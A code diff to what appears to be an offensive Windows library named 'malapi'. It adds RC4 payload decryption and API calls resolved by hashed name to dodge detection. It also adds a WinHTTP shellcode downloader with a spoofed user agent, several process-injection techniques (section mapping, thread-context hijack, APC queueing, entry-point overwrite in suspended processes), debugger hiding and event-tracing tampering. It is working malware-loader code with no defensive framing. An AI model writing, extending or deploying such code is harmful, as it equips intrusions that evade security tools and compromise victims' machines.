@@ -17,14 +17,42 @@ namespace malapi
 	{
 		for (SIZE_T i = 0; i < InputLen; i++)
 			Input[i] ^= Key[i % KeyLen];
-	}
-
-	VOID AES(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
-	{
+		return;
 	}
 
 	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
 	{
+		BYTE S[256];
+		BYTE T[256];
+
+		for (int i = 0; i < 256; i++)
+		{
+			S[i] = i;
+			T[i] = Key[i % KeyLen];
+		}
+
+		int j = 0;
+		for (int i = 0; i < 256; i++)
+		{
+			j = (j + S[i] + T[i]) % 256;
+			BYTE temp = S[i];
+			S[i] = S[j];
+			S[j] = temp;
+		}
+
+		int i = 0;
+		j = 0;
+		for (SIZE_T k = 0; k < InputLen; k++)
+		{
+			i = (i + 1) % 256;
+			j = (j + S[i]) % 256;
+			BYTE temp = S[i];
+			S[i] = S[j];
+			S[j] = temp;
+			BYTE K = S[(S[i] + S[j]) % 256];
+			Input[k] ^= K;
+		}
+		return;
 	}
 
 	/////////////////////////////
@@ -100,6 +128,21 @@ namespace malapi
 		return NULL;
 	}
 
+	HMODULE LoadLibraryC(_In_ LPCSTR library_path)
+	{
+		HMODULE kernel32 = NULL;
+
+		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr DWORD hash_loadlibrarya = HashStringFowlerNollVoVariant1a("LoadLibraryA");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return NULL;
+
+		typeLoadLibraryA LoadLibraryA = (typeLoadLibraryA)GetProcAddressC(kernel32, hash_loadlibrarya);
+
+		return LoadLibraryA(library_path);
+	}
+
 	//
 	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
 	// Returns NULL on failure.
@@ -168,11 +211,7 @@ namespace malapi
 		constexpr DWORD hash_openprocess = HashStringFowlerNollVoVariant1a("OpenProcess");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_krn32);
-		if (!kernel32)
-		{
-			LOG_ERROR("GetModuleHandle failed to get kernel32.dll.");
-			return NULL;
-		}
+		if (!kernel32) return NULL;
 
 		typeOpenProcess OpenProcessC = (typeOpenProcess)GetProcAddressC(kernel32, hash_openprocess);
 		if (!OpenProcessC)
@@ -180,8 +219,7 @@ namespace malapi
 			LOG_ERROR("GetProcAddress failed to get OpenProcess.");
 			return NULL;
 		}
-
-		process = OpenProcessC(PROCESS_ALL_ACCESS, FALSE, process_id);
+		process = OpenProcessC((PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_SET_QUOTA), FALSE, process_id);
 
 		LOG_SUCCESS("Process Handle: 0x%08lX", process);
 
@@ -295,6 +333,8 @@ namespace malapi
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
 		HMODULE winhttp = NULL;
+		*shellcode = NULL;
+		*shellcode_size = 0;
 
 		LPCWSTR user_agent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100 ABLELDR/1.1";
 		DWORD bytes_read = 0;
@@ -316,11 +356,9 @@ namespace malapi
 		typeWinHttpReadData WinHttpReadDataC = NULL;
 		typeWinHttpCloseHandle WinHttpCloseHandleC = NULL;
 
-		typeLoadLibraryA LoadLibraryC = NULL;
 		typeGetLastError GetLastErrorC = NULL;
 
 		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_loadlibrarya = HashStringFowlerNollVoVariant1a("LoadLibraryA");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
 		constexpr ULONG hash_winhttpopen = HashStringFowlerNollVoVariant1a("WinHttpOpen");
@@ -333,7 +371,6 @@ namespace malapi
 
 		kernel32 = GetModuleHandleC(hash_kernel32);
 
-		LoadLibraryC = (typeLoadLibraryA)GetProcAddressC(kernel32, hash_loadlibrarya);
 		winhttp = LoadLibraryC("Winhttp.dll");
 		//PDARKMODULE winhttp_dll = DarkLoadLibrary(LOAD_LOCAL_FILE, L"C:\\Windows\\System32\\winhttp.dll", NULL, 0, NULL);
 		//winhttp = (HMODULE)winhttp_dll->ModuleBase;
@@ -479,8 +516,9 @@ namespace malapi
 		if (!kernel32) return NULL;
 		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);
 
-		STARTUPINFOW si;
-		PROCESS_INFORMATION pi;
+		STARTUPINFOW si = {};
+		PROCESS_INFORMATION pi = {};
+		si.cb = sizeof(STARTUPINFO);
 
 		// TODO: add macro in malapi.hpp
 		ZeroMemoryEx(&si, sizeof(si));
@@ -513,18 +551,18 @@ namespace malapi
 	{
 		STARTUPINFOA si = {};
 		PROCESS_INFORMATION pi = {};
+		*process_handle = INVALID_HANDLE_VALUE;
+		*thread_handle = INVALID_HANDLE_VALUE;
 
 #pragma region winapi_imports
 
 		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
-		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
-		if (!kernel32) return INVALID_HANDLE_VALUE;
+		if (!kernel32) return NULL;
 
-		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
-		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
+		typeCreateProcessA CreateProcessA = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
 
 #pragma endregion
 
@@ -533,7 +571,7 @@ namespace malapi
 
 		si.cb = sizeof(STARTUPINFOA);
 
-		BOOL success = CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
+		BOOL success = CreateProcessA(NULL, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
 
 		if (!success) return NULL;
 
@@ -577,13 +615,13 @@ namespace malapi
 		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
 		if (!kernel32 || !ntdll) return NULL;
 
-		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
+		typeCreateProcessA CreateProcess = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
 		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
-		typeWriteProcessMemory WriteProcessMemoryC = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
+		typeWriteProcessMemory WriteProcessMemory = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
 		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
 
 		typeNtQueryInformationProcess NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
-		typeNtQueryInformationThread NtQueryInformationThreadC = (typeNtQueryInformationThread)GetProcAddressC(ntdll, hash_ntqueryinformationthread);
+		typeNtQueryInformationThread NtQueryInformationThread = (typeNtQueryInformationThread)GetProcAddressC(ntdll, hash_ntqueryinformationthread);
 		typeNtReadVirtualMemory NtReadVirtualMemoryC = (typeNtReadVirtualMemory)GetProcAddressC(ntdll, hash_ntreadvirtualmemory);
 
 #pragma endregion
@@ -594,7 +632,7 @@ namespace malapi
 
 		si.cb = sizeof(STARTUPINFOA);
 
-		if (CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi) == 0)
+		if (!CreateProcess(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi))
 		{
 			LOG_ERROR("Failed to Create Process. (Code: %016llX)", GetLastErrorC());
 			goto CLEANUP;
@@ -603,14 +641,14 @@ namespace malapi
 		LOG_INFO("Process Handle: %p", pi.hProcess);
 		LOG_INFO("Thread Handle: %p", pi.hThread);
 
-		if (!NT_SUCCESS(NtQueryInformationThreadC(pi.hThread, (THREADINFOCLASS)9, &code_entry, sizeof(PVOID), &return_length)))
+		if (!NT_SUCCESS(NtQueryInformationThread(pi.hThread, (THREADINFOCLASS)9, &code_entry, sizeof(PVOID), &return_length)))
 		{
 			LOG_ERROR("Failed to Query Thread Information");
 			return INVALID_HANDLE_VALUE;
 		}
 		LOG_SUCCESS("Thread Address: 0x%016llX", code_entry);
 
-		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
+		if (!WriteProcessMemory(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
 		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);
 
 	CLEANUP:
@@ -948,6 +986,37 @@ namespace malapi
 		return;
 	}
 
+	//////////////////////////////////
+   //                              //
+  //      Alternative Signal      //
+ //                              //
+//////////////////////////////////
+
+	VOID SleepEx(DWORD wait_time, BOOL alertable)
+	{
+		HMODULE kernel32 = NULL;
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_sleepex = HashStringFowlerNollVoVariant1a("SleepEx");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return;
+
+		typeSleepEx SleepEx = (typeSleepEx)GetProcAddressC(kernel32, hash_sleepex);
+		SleepEx(wait_time, alertable);
+	}
+
+	VOID WaitForSingleObject(HANDLE handle, DWORD wait_time)
+	{
+		HMODULE kernel32 = NULL;
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_waitforsingleobject = HashStringFowlerNollVoVariant1a("WaitForSingleObject");
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return;
+		typeWaitForSingleObject WaitForSingleObject = (typeWaitForSingleObject)GetProcAddressC(kernel32, hash_waitforsingleobject);
+
+		WaitForSingleObject(handle, wait_time);
+	}
+
 	/////////////////////////////////
    //                             //
   //      Process Injection      //
@@ -955,7 +1024,7 @@ namespace malapi
 /////////////////////////////////
 
 	//
-	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
+	// Inject shellcode into a target process via NtCreateSection -> NtMapViewOfSection -> RtlCreateUserThread.
 	//
 	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle)
 	{
@@ -1087,14 +1156,14 @@ namespace malapi
 
 #pragma region Imports
 
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
-		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
-		constexpr ULONG hash_ntcreatethreadex = malapi::HashStringFowlerNollVoVariant1a("NtCreateThreadEx");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_ntwaitforsingleobject = HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
+		constexpr ULONG hash_ntcreatethreadex = HashStringFowlerNollVoVariant1a("NtCreateThreadEx");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		ntdll = GetModuleHandleC(hash_ntdll);
 		if (!kernel32 || !ntdll) return FALSE;
 
 		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
@@ -1145,46 +1214,46 @@ namespace malapi
 
 #pragma region Imports
 
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
-		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
-		constexpr ULONG hash_getprocessid = malapi::HashStringFowlerNollVoVariant1a("GetProcessId");
-		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
-		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_virtualfreeex = HashStringFowlerNollVoVariant1a("VirtualFreeEx");
+		constexpr ULONG hash_getprocessid = HashStringFowlerNollVoVariant1a("GetProcessId");
+		constexpr ULONG hash_ntwaitforsingleobject = HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
+		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");
 
-		constexpr ULONG hash_createtoolhelp32snapshot = malapi::HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
-		constexpr ULONG hash_thread32first = malapi::HashStringFowlerNollVoVariant1a("Thread32First");
-		constexpr ULONG hash_thread32next = malapi::HashStringFowlerNollVoVariant1a("Thread32Next");
-		constexpr ULONG hash_openthread = malapi::HashStringFowlerNollVoVariant1a("OpenThread");
-		constexpr ULONG hash_suspendthread = malapi::HashStringFowlerNollVoVariant1a("SuspendThread");
-		constexpr ULONG hash_gethreadcontext = malapi::HashStringFowlerNollVoVariant1a("GetThreadContext");
-		constexpr ULONG hash_sethreadcontext = malapi::HashStringFowlerNollVoVariant1a("SetThreadContext");
+		constexpr ULONG hash_createtoolhelp32snapshot = HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
+		constexpr ULONG hash_thread32first = HashStringFowlerNollVoVariant1a("Thread32First");
+		constexpr ULONG hash_thread32next = HashStringFowlerNollVoVariant1a("Thread32Next");
+		constexpr ULONG hash_openthread = HashStringFowlerNollVoVariant1a("OpenThread");
+		constexpr ULONG hash_suspendthread = HashStringFowlerNollVoVariant1a("SuspendThread");
+		constexpr ULONG hash_gethreadcontext = HashStringFowlerNollVoVariant1a("GetThreadContext");
+		constexpr ULONG hash_sethreadcontext = HashStringFowlerNollVoVariant1a("SetThreadContext");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		ntdll = GetModuleHandleC(hash_ntdll);
 		if (!kernel32 || !ntdll) return FALSE;
 
-		typeGetLastError GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
-		typeVirtualFreeEx VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
-		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)malapi::GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
-		typeThread32First Thread32FirstC = (typeThread32First)malapi::GetProcAddressC(kernel32, hash_thread32first);
-		typeThread32Next Thread32NextC = (typeThread32Next)malapi::GetProcAddressC(kernel32, hash_thread32next);
-		typeGetProcessId GetProcessIdC = (typeGetProcessId)malapi::GetProcAddressC(kernel32, hash_getprocessid);
-		typeOpenThread OpenThreadC = (typeOpenThread)malapi::GetProcAddressC(kernel32, hash_openthread);
-		typeSuspendThread SuspendThreadC = (typeSuspendThread)malapi::GetProcAddressC(kernel32, hash_suspendthread);
-		typeGetThreadContext GetThreadContextC = (typeGetThreadContext)malapi::GetProcAddressC(kernel32, hash_gethreadcontext);
-		typeSetThreadContext SetThreadContextC = (typeSetThreadContext)malapi::GetProcAddressC(kernel32, hash_sethreadcontext);
+		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
+		typeVirtualFreeEx VirtualFreeExC = (typeVirtualFreeEx)GetProcAddressC(kernel32, hash_virtualfreeex);
+		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
+		typeThread32First Thread32FirstC = (typeThread32First)GetProcAddressC(kernel32, hash_thread32first);
+		typeThread32Next Thread32NextC = (typeThread32Next)GetProcAddressC(kernel32, hash_thread32next);
+		typeGetProcessId GetProcessIdC = (typeGetProcessId)GetProcAddressC(kernel32, hash_getprocessid);
+		typeOpenThread OpenThreadC = (typeOpenThread)GetProcAddressC(kernel32, hash_openthread);
+		typeSuspendThread SuspendThreadC = (typeSuspendThread)GetProcAddressC(kernel32, hash_suspendthread);
+		typeGetThreadContext GetThreadContextC = (typeGetThreadContext)GetProcAddressC(kernel32, hash_gethreadcontext);
+		typeSetThreadContext SetThreadContextC = (typeSetThreadContext)GetProcAddressC(kernel32, hash_sethreadcontext);
 
-		typeNtWaitForSingleObject NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
-		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		typeNtWaitForSingleObject NtWaitForSingleObjectC = (typeNtWaitForSingleObject)GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
+		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);
 
 #pragma endregion
 
 		context.ContextFlags = CONTEXT_FULL;
 		thread_entry.dwSize = sizeof(THREADENTRY32);
 
-		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
+		address_ptr = WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
 
 		proc_snapshot = CreateToolhelp32SnapshotC(TH32CS_SNAPTHREAD, 0);
 		LOG_INFO("Process Snapshot: %08lX", proc_snapshot);
@@ -1207,7 +1276,7 @@ namespace malapi
 			}
 		}
 
-		malapi::HideFromDebugger(thread_handle);
+		HideFromDebugger(thread_handle);
 
 		if (!SuspendThreadC(thread_handle))
 		{
@@ -1259,13 +1328,13 @@ namespace malapi
 
 #pragma region Imports
 
-		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
-		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 
-		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		ntdll = GetModuleHandleC(hash_ntdll);
 		if (!ntdll) return FALSE;
 
-		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);
 
 #pragma endregion
 
@@ -1290,13 +1359,13 @@ namespace malapi
 
 #pragma region Imports
 
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+		kernel32 = GetModuleHandleC(hash_kernel32);
 		if (!kernel32) return FALSE;
 
-		typeGetLastError GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
+		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
 
 #pragma endregion
 
@@ -1321,23 +1390,23 @@ namespace malapi
 		HMODULE kernel32 = NULL;
 
 #pragma region Imports
-		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
-		constexpr ULONG hash_queueuserapc = malapi::HashStringFowlerNollVoVariant1a("QueueUserAPC");
-		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntresumethread = HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_queueuserapc = HashStringFowlerNollVoVariant1a("QueueUserAPC");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 
-		ntdll = malapi::GetModuleHandleC(hash_ntdll);
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+		ntdll = GetModuleHandleC(hash_ntdll);
+		kernel32 = GetModuleHandleC(hash_kernel32);
 
-		typeQueueUserAPC QueueUserAPCC = (typeQueueUserAPC)malapi::GetProcAddressC(kernel32, hash_queueuserapc);
-		typeNtResumeThread NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		typeQueueUserAPC QueueUserAPC = (typeQueueUserAPC)GetProcAddressC(kernel32, hash_queueuserapc);
+		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddressC(ntdll, hash_ntresumethread);
 
 #pragma endregion
 
-		HANDLE base_address = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
-		QueueUserAPCC((PAPCFUNC)base_address, additional_handle, 0);
+		HANDLE base_address = WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
+		QueueUserAPC((PAPCFUNC)base_address, additional_handle, 0);
 
-		NtResumeThreadC(additional_handle, NULL);
+		NtResumeThread(additional_handle, NULL);
 		LOG_SUCCESS("Resuming Thread");
 
 		success = TRUE;
@@ -1433,8 +1502,6 @@ namespace malapi
 		DWORD old_protection = 0;
 
 #pragma region imports
-		typeVirtualProtectEx VirtualProtectEx = NULL;
-		FARPROC NtTraceEvent = NULL;
 
 		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
@@ -1445,8 +1512,8 @@ namespace malapi
 		ntdll = GetModuleHandleC(hash_ntdll);
 		if (kernel32 == NULL || ntdll == NULL) return success;
 
-		VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
-		NtTraceEvent = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);
+		typeVirtualProtectEx VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
+		FARPROC NtTraceEvent = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);
 
 #pragma endregion
 
@@ -1585,12 +1652,84 @@ namespace malapi
  //                   //
 ///////////////////////
 
-	//
-	// Sets the current service status and reports it to the SCM.
-	// Return None
-	//
-	VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint)
+	HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName)
 	{
-		static DWORD checkpoint = 1;
+		HMODULE advapi32 = NULL;
+
+		const ULONG hash_createeventa = HashStringFowlerNollVoVariant1a("CreateEventA");
+
+		advapi32 = LoadLibraryC("ADVAPI32.DLL");
+		typeCreateEventA CreateEventA = (typeCreateEventA)GetProcAddressC(advapi32, hash_createeventa);
+
+		return CreateEventA(lpEventAttributes, bManualReset, bInitialState, lpName);
+	}
+
+	HANDLE CreateEventW(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName)
+	{
+		HMODULE advapi32 = NULL;
+
+		const ULONG hash_createeventw = HashStringFowlerNollVoVariant1a("CreateEventW");
+
+		advapi32 = LoadLibraryC("ADVAPI32.DLL");
+
+		typeCreateEventW CreateEventW = (typeCreateEventW)GetProcAddressC(advapi32, hash_createeventw);
+
+		return CreateEventW(lpEventAttributes, bManualReset, bInitialState, lpName);
+	}
+
+	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(_In_ LPCSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc)
+	{
+		HMODULE advapi32 = NULL;
+		const ULONG hash_registerservicectrlhandlera = HashStringFowlerNollVoVariant1a("RegisterServiceCtrlHandlerA");
+
+		advapi32 = LoadLibraryC("Advapi32.dll");
+		if (!advapi32) return NULL;
+
+		typeRegisterServiceCtrlHandlerA RegisterServiceCtrlHandlerA = (typeRegisterServiceCtrlHandlerA)GetProcAddressC(advapi32, hash_registerservicectrlhandlera);
+		return RegisterServiceCtrlHandlerA(lpServiceName, lpHandlerProc);
+	}
+
+	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerW(_In_ LPCWSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc)
+	{
+		HMODULE advapi32 = NULL;
+
+		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
+		const ULONG hash_registerservicectrlhandlerw = HashStringFowlerNollVoVariant1a("RegisterServiceCtrlHandlerW");
+
+		advapi32 = LoadLibraryC("Advapi32.dll");
+		if (!advapi32) return NULL;
+
+		typeRegisterServiceCtrlHandlerW RegisterServiceCtrlHandlerW = (typeRegisterServiceCtrlHandlerW)GetProcAddressC(advapi32, hash_registerservicectrlhandlerw);
+		return RegisterServiceCtrlHandlerW(lpServiceName, lpHandlerProc);
+	}
+
+	BOOL StartServiceCtrlDispatcherA(_In_ CONST SERVICE_TABLE_ENTRYA* lpServiceStartTable)
+	{
+		HMODULE advapi32 = NULL;
+
+		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
+		const ULONG hash_startservicectrldispatchera = HashStringFowlerNollVoVariant1a("StartServiceCtrlDispatcherA");
+
+		advapi32 = LoadLibraryC("Advapi32.dll");
+
+		if (!advapi32) return FALSE;
+		typeStartServiceCtrlDispatcherA StartServiceCtrlDispatcherA = (typeStartServiceCtrlDispatcherA)GetProcAddressC(advapi32, hash_startservicectrldispatchera);
+
+		return StartServiceCtrlDispatcherA(lpServiceStartTable);
+	}
+
+	BOOL StartServiceCtrlDispatcherW(_In_ CONST SERVICE_TABLE_ENTRYW* lpServiceStartTable)
+	{
+		HMODULE advapi32 = NULL;
+
+		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
+		const ULONG hash_startservicectrldispatcherw = HashStringFowlerNollVoVariant1a("StartServiceCtrlDispatcherW");
+
+		advapi32 = LoadLibraryC("Advapi32.dll");
+		if (!advapi32) return FALSE;
+
+		typeStartServiceCtrlDispatcherW StartServiceCtrlDispatcherW = (typeStartServiceCtrlDispatcherW)GetProcAddressC(advapi32, hash_startservicectrldispatcherw);
+
+		return StartServiceCtrlDispatcherW(lpServiceStartTable);
 	}
 }
